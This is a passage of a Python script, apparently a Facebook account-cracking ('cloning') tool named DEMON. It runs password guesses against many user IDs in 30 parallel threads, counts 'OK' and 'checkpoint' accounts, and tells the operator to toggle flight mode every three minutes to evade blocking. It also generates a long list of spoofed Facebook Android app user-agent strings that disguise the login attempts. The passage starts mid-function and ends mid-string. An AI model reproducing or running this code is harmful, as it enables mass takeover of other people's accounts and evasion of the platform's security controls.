		logo()		
		p(" [•] Total Accounts : %s "%(str(len(id))))
		p(" [•] Use Flight Mode After Every 3 Minutes") 
		p(" [•] Cracking Has Been Started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					saqi.submit(self.method4,uid,nm,pwx)
				elif "v" in method:
					saqi.submit(self.method5,uid,nm,pwx)
				elif "vi" in method:
					saqi.submit(self.method6,uid,nm,pwx)
				elif "vii" in method:
					saqi.submit(self.method7,uid,nm,pwx)
				elif "viii" in method:
					saqi.submit(self.method8,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()		
		p(" [•] Cloning Has been Completed ")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.DEMON()
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [DEMON] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,440)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			facebook_version2 = f'{random.randint(10,999)}.0.0.{random.randint(0,999)}'
			dbav = str(random.randint(1000000, 9999999))
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			fbsv = f"{random.uniform(4.0, 10.0):.1f}"
			density = random.choice(["2.0","2.25","2.625","2.75","3.0","3.25","3 75"])
			width = random.randint(720, 1440)
			height = random.randint(1080, 2560)
			fblc = random.choice(["en_NG","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ha_NG","ru_RU","zh_CN","ar_AE","en_GB"])
			lan = random.choice(["en_US","fr_FR","ha_NG","en_GB"])
			fbcr = random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG","BeSafe Airtel","9mobile"])
			andro = str(random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','6.0.1','5.0','4.0','4.3.4','7.0.1','8.0.1','8.1.0','3','4','5','6','7','8','9','10','11','12','13']))
			fban = random.choice(["FB4A", "FB5A", "FB6A"])		
			archi = random.choice(['armeabi-v7a:armeabi','arm64-v8a:','arm64-v8a:null','x86:armeabi-v7a','arm64-v8a:armeabi-v7a:armeabi'])
			DEMON_ua = f"[FBAN/FB4A;FBAV/{facebook_version2};FBBV/{dbav};[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height}"+"}"+f";FBLC/en_US;FBRV/{fbbv};FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-{samsung};FBSV/{random.randint(10,13)};FBOP/19;FBCA/arm64-v8a:;]"
			DEMON_ua = f"[FBAN/FB4A;FBAV/{facebook_version2};FBBV/{dbav};[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height}"+"}"+f";FBLC/en_US;FBRV/{fbrv};FBCR/{fbcr};FBMF/meizu;FBBD/meizu;FBPN/com.facebook.katana;FBDV/meizu note9/DS;FBSV/9.0.0;FBOP/1;FBCA/arm64-v8a:;]"
			DEMON_ua = f"[FBAN/FB4A;FBAV/{facebook_version2};FBBV/{dbav};[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/"+"{"+f"density={density},width={width},height={height}"+"}"+f";FBLC/en_US;FBRV/{fbrv};FBCR/{fbcr};FBMF/Coolpad;FBBD/Coolpad;FBPN/com.facebook.katana;FBDV/C1-U02;FBSV/"+f"{andro};FBOP/1;FBCA/{archi};]"
			DEMON_ua = f"[FBAN/FB4A;FBAV/39.0.0.26.99;FBBV/18394593;[FBAN/FB4A;FBAV/250.0.0.26.241;FBBV/187584949;FBDM/"+"{"+"density=2.25,width=720,height=1332"+"}"+f";FBLC/en_US;FBRV/{fbrv};FBCR/{fbcr};FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/W-V720-EEA;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
			DEMON_ua = random.choice(['[FBAN/FB4A;FBAV/60.0.0.47.62;FBBV/23784374;FBDM/{density=2.5,width=980,height=1600};FBLC/en_US;FBRV/27457394;FBPN/com.facebook.katana;FBCR/;FBMF/KYOCERA;FBBD/KYOCERA;FBDV/KYV42;FBSV/7.1.1;FBOP/19;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/MTN NG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I337M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500M;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/EE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Meteor;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1039;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/vodafone UK;FBMF/Sony;FBBD/orange;FBPN/com.facebook.katana;FBDV/C5303;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]'])
			DEMON_ua = "[FBAN/FB4A;FBAV/247.0.0.42.116;FBBV/182642072;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/184895505;FBCR/MTN NG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/SM-A022F/;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
			DEMON_ua = "[FBAN/;FBAV/;FBBV/z3;FBDM/{density=3.0334,width=1080,height=1920};FBLC/;FBRV/;FBCR/;FBMF/;FBBD/;FBPN/;FBDV/;FBSV/;FBOP/19;FBCA/;]"
			DEMON_ua =  random.choice(["[FBAN/FB4A;FBAV/59.0.0.13.313;FBBV/19955368;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S975L;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/407.0.0.30.97;FBBV/458543257;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/460531678;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e(7) plus;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/412.0.0.22.115;FBBV/468774617;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/470537983;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/411.1.0.29.112;FBBV/466874235;FBDM/{density=2.625,width=1080,height=2183};FBLC/en_US;FBRV/468551777;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]","FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a","[FBAN/FB4A;FBAV/409.0.0.27.106;FBBV/462563389;FBDM/{density=2.8125,width=1080,height=2190};FBLC/en_US;FBRV/464602213;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/13;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]","Dalvik/2.1.0 (Linux; U; Android 11; moto g go Build/RRHG31.Q3-37-43-43-5-4) [FBAN/FB4A;FBAV/386.0.0.35.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/402949595;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBDV/moto g go;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1504};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/396.0.0.21.104;FBBV/428168139;FBDM/{density=1.3312501,width=800,height=1216};FBLC/en_US;FBRV/429820205;FBCR/;FBMF/Qlink;FBBD/Qlink;FBPN/com.facebook.katana;FBDV/Scepter8;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 6.0.1; D6503 Build/23.5.A.1.291) [FBAN/Orca-Android;FBAV/139.0.0.17.85;FBPN/com.facebook.orca;FBLC/in_ID;FBBV/74871072;FBCR/"+fbcr+";FBMF/Sony;FBBD/Sony;FBDV/D6503;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]","Mozilla/5.0 (Linux; Android 11; ONEPLUS A6003 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/PAAA;FBAV/398.0.0.27.97;FBDM/{density=3.0,width=1080,height=2057};FBLC/en_US;FBBV/458437540;FB_FW/2;FBSN/Android;FBDI/86d59981-2b37-4fbe-aa09-4a8bd479c6fe;FBCR/"+fbcr+";FBMF/OnePlus;FBBD/OnePlus;FBDV/ONEPLUS A6003;FBSV/11;FBCA/arm64-v8a:null;]","Dalvik/2.1.0 (Linux; U; Android 10; moto e(7i) power Build/QOJS30.506-7-18) [FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/es_US;FBBV/458543253;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBDV/moto e(7i) power;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1472};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/405.1.0.28.72;FBBV/455203920;FBDM/{density=3.375,width=1080,height=2139};FBLC/ro_RO;FBRV/0;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/453370252;FBDM/{density=3.0,width=1080,height=2156};FBLC/en_US;FBRV/455160500;FBCR/"+fbcr+";FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2065;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/25.0.0.52.53;FBBV/20097162;FBDM/{density=1.4,width=1450,height=2570};FBLC/en_US;FBCR/"+fbcr+";FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto G Stylus (2021);FBSV/7.1.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/16.0.0.20.15;FBBV/4061184;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FB_FW/2;FBCR/"+fbcr+";FBPN/com.facebook.katana;FBDV/Lenovo A850+;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/414.0.0.30.113;FBBV/473313172;FBDM/{density=2.625,width=1080,height=2205};FBLC/en_US;FBRV/475574872;FBCR/Google Fi;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 6a;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]", "Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H) [FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/zh_CN;FBBV/394408512;FBCR/EE;FBMF/Asus;FBBD/Asus;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=800,height=1280};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/418.0.0.33.69;FBBV/482142412;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/483737047;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J400M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/418.0.0.33.69;FBBV/482142437;FBDM/{density=2.625,width=1080,height=2174};FBLC/en_US;FBRV/483737047;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g41;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/406.0.0.26.90;FBBV/456153941;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_US;FBRV/0;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2026;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/396.0.0.21.104;FBBV/428168139;FBDM/{density=1.3312501,width=800,height=1216};FBLC/en_US;FBRV/429820205;FBCR/;FBMF/Qlink;FBBD/Qlink;FBPN/com.facebook.katana;FBDV/Scepter8;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 10; moto e(7i) power Build/QOJS30.506-7-18) [FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/es_US;FBBV/458543253;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBDV/moto e(7i) power;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1472};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/405.1.0.28.72;FBBV/455203920;FBDM/{density=3.375,width=1080,height=2139};FBLC/ro_RO;FBRV/0;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/405.1.0.28.72;FBBV/455203952;FBDM/{density=3.1875,width=1080,height=2159};FBLC/en_US;FBRV/456763519;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A536B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]", "[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=2060};FBLC/en_US;FBRV/273364224;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=3.0,width=1080,height=2110};FBLC/en_US;FBRV/271519795;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2147};FBLC/en_US;FBRV/273494982;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2180};FBLC/en_US;FBRV/273736137;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2007J3SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2107};FBLC/en_US;FBRV/273695459;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2135};FBLC/en_US;FBRV/273731541;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/273781587;FBCR/"+fbbv+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.625,width=1080,height=2184};FBLC/en_US;FBRV/273160185;FBCR/"+fbbv+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A415F;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/273589450;FBCR/"+fbbv+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A920F;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/273474118;FBCR/;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/273837177;FBCR/"+fbbv+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2270};FBLC/en_US;FBRV/274073372;FBCR/"+fbbv+";FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/POCO F2 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/274073372;FBCR/"+fbbv+";FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/H4113;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401174;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/274073372;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/274352184;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STF-L09;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922292;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/274536441;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=2.75,width=1080,height=2130};FBLC/en_US;FBRV/274630178;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=3.375,width=1080,height=2011};FBLC/en_US;FBRV/274630178;FBCR/"+fbcr+";FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00TD;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922292;FBDM/{density=3.0,width=1080,height=1794};FBLC/en_US;FBRV/274669536;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PRA-LX1;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=3.0,width=1080,height=2178};FBLC/en_US;FBRV/274614947;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G980F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2107};FBLC/en_US;FBRV/274073372;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.625,width=1080,height=2132};FBLC/en_US;FBRV/274852780;FBCR/"+fbcr+";FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7.2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342878;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBRV/268824966;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803856;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/271519795;FBCR/;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/REVVL 2;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=2.75,width=1080,height=2168};FBLC/en_US;FBRV/275364963;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9S;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372446;FBDM/{density=3.0,width=1080,height=2090};FBLC/en_US;FBRV/225933467;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340670;FBDM/{density=2.0,width=720,height=1384};FBLC/en_US;FBRV/0;FBCR/"+fbcr+".;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265244930;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/267438968;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J250G;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797384;FBDM/{density=2.0,width=720,height=1424};FBLC/en_US;FBRV/275412984;FBCR/"+fbcr+";FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1901;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=2.625,width=1080,height=2131};FBLC/en_US;FBRV/276081113;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797387;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBRV/276198575;FBCR/"+fbcr+";FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H850;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797113;FBDM/{density=2.625,width=1080,height=2137};FBLC/en_US;FBRV/276333355;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one zoom;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=3.0,width=1080,height=2265};FBLC/en_US;FBRV/276389460;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.625,width=1080,height=2134};FBLC/en_US;FBRV/275142282;FBCR/"+fbcr+";FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A6013;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987656;FBDM/{density=1.75,width=720,height=1448};FBLC/en_US;FBRV/276404237;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217M;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","Dalvik/2.1.0 (Linux; U; Android 9; FIG-LX1 Build/HUAWEIFIG-L31) [FBAN/Orca-Android;FBAV/302.0.0.11.117;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/275958904;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBDV/FIG-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2032};FB_FW/1;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273921911;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/274807707;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=2.75,width=1080,height=2168};FBLC/en_US;FBRV/277267055;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=3.0,width=1080,height=2020};FBLC/en_US;FBRV/277454707;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987623;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/277531280;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987624;FBDM/{density=3.0,width=1080,height=1776};FBLC/sv_SE;FBRV/277662387;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5S) Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 9; Kirin Treble Build/PQ2A.190405.003) 